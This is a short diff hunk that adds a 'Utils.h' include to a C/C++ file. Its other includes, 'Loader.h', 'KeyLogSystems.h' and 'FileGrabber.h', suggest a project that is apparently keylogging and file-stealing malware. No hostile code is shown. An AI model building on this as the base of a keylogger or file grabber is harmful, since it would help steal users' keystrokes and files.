@@ -2,6 +2,7 @@
 #include "Strings.h"
 #include "Memory.h"
 #include "Loader.h"
+#include "Utils.h"
 #include "KeyLogSystems.h"
 #include "FileGrabber.h"
 
